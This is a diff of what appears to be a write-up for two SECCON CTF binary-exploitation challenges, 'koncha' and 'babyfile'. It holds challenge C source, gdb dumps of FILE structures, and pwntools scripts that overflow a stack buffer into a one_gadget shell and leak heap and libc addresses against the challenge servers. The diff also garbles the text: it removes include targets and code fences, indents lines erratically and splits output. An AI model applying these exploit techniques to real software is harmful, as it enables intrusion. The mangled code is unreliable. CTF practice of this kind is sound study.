@@ -5,8 +5,8 @@
 
 
 ```
-#include <stdio.h>
-#include <unistd.h>
+    #include <stdio.h>
+    #include 
 
 int main() {
  char name[0x30], country[0x20];
@@ -32,12 +32,7 @@ void setup(void) {
  setbuf(stdout, NULL);
  alarm(180);
 }
-```
-
-
-
-```
-ubuntu@ubuntu:~/ctf/koncha/bin$ ./chall 
+ubuntu@ubuntu:~/ctf/koncha/bin$ ./chall
 Hello! What is your name?
 AAAAAAa
 Nice to meet you, AAAAAAa!
@@ -45,32 +40,22 @@ Which country do you live in?
 BBBBBBBBBBBBBBBBBBBBBBBBBBBBB
 Wow, BBBBBBBBBBBBBBBBBBBBBBBBBBBBB is such a nice country!
 It was nice meeting you. Goodbye!
-```
-
-
-
-```
 gdb-peda$ checksec
 CANARY : disabled
 FORTIFY : disabled
 NX : ENABLED
 PIE : disabled
 RELRO : FULL
-```
-
-
-
-```
 from pwn import *
 
 elf=ELF("/home/ubuntu/ctf/koncha/bin/chall")
 libc=ELF("/home/ubuntu/ctf/koncha/lib/libc.so.6")
 
-#p=process("/home/ubuntu/ctf/koncha/bin/chall"
+    #p=process("/home/ubuntu/ctf/koncha/bin/chall"
 # , aslr=False
 # ,env={"LD_PRELOAD" : "/home/ubuntu/ctf/koncha/lib/libc.so.6"} )
 
-#gdb.attach(p)
+    #gdb.attach(p)
 p=remote("koncha.seccon.games",9001)
 
 p.sendlineafter("Hello! What is your name?", "")
@@ -81,20 +66,15 @@ log.info("libc base is :"+hex(libc_base))
 one_gadget=0xe3b01
 p.sendlineafter("Which country do you live in?", cyclic(88)+p64(libc_base+one_gadget))
 p.interactive()
-```
-
-
-
-```
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include 
 
 static int menu(void);
 static int getnline(char *buf, int size);
 static int getint(void);
 
-#define write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)
+    #define write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)
 
 int main(void){
 	FILE *fp;
@@ -164,12 +144,7 @@ static int getint(void){
 	getnline(buf, sizeof(buf));
 	return atoi(buf);
 }
-```
-
-
-
-```
-ubuntu@ubuntu:~/ctf/babyfile/babyfile$ ./chall 
+ubuntu@ubuntu:~/ctf/babyfile/babyfile$ ./chall
 Play with FILE structure
 
 MENU
@@ -192,22 +167,12 @@ MENU
 1. Flush
 2. Trick
 0. Exit
-```
-
-
-
-```
 gdb-peda$ checksec
 CANARY : ENABLED
 FORTIFY : disabled
 NX : ENABLED
 PIE : disabled
 RELRO : FULL
-```
-
-
-
-```
 pwndbg> p *((struct _IO_FILE_plus *)0x5555555592a0)
 $1 = {
  file = {
@@ -243,11 +208,6 @@ $1 = {
  },
  vtable = 0x1555554ee600 <_IO_file_jumps>
 }
-```
-
-
-
-```
 pwndbg> p *((struct _IO_jump_t *) 0x1555554ee600)
 $2 = {
  __dummy = 0,
@@ -272,11 +232,6 @@ $2 = {
  __showmanyc = 0x1555553674a0 <_IO_default_showmanyc>,
  __imbue = 0x1555553674b0 <_IO_default_imbue>
 }
-```
-
-
-
-```
 gdb-peda$ p *((struct _IO_FILE_plus *) 0x56427f01b2a0)
 $1 = {
  file = {
@@ -312,33 +267,25 @@ $1 = {
  },
  vtable = 0x7f6a7e2f74b0 <_IO_file_jumps+16>
 }
-```
-
-
-
-```
 ['0x2e656e6f44']
 ['0x55b4bc5e2480', '0x55b4bc5e2480', '0x55b4bc5efe80', '0x55b4bc5e4480', '0x55b4bc5e2480', '0x55b4bc5e4480', '0x55b4bc5e2480', '0x55b4bc5e4510', '0x55b4bc5e2480', '0x7fa89316e5c0', '0x55b4bc5e2380', '0xffffffffffffffff', '0x7fa89316a4a0', '0x7fa893174580', '0x7fa893169f60', '0x2e656e6f44']
-[*] heap leak:0x55b4bc5e2000 libc_leak:0x7fa892f81000
+[*] heap leak:
+0x55b4bc5e2000 libc_leak:
+0x7fa892f81000
 [*] Switching to interactive mode
  Done.
-```
-
-
-
-```
 from pwn import *
 
 elf=ELF("/home/ubuntu/ctf/babyfile/babyfile/chall")
 libc=ELF("/home/ubuntu/ctf/babyfile/babyfile/libc-2.31.so")
 
-#p=process("/home/ubuntu/ctf/babyfile/babyfile/chall"
+    #p=process("/home/ubuntu/ctf/babyfile/babyfile/chall"
 # , aslr=True
 # ,env={"LD_PRELOAD" : "/home/ubuntu/ctf/babyfile/babyfile/libc-2.31.so"} )
 
 p=remote("babyfile.seccon.games",3157)
 
-#gdb.attach(p)
+    #gdb.attach(p)
 
 def flush():
  p.sendlineafter(">", "1")
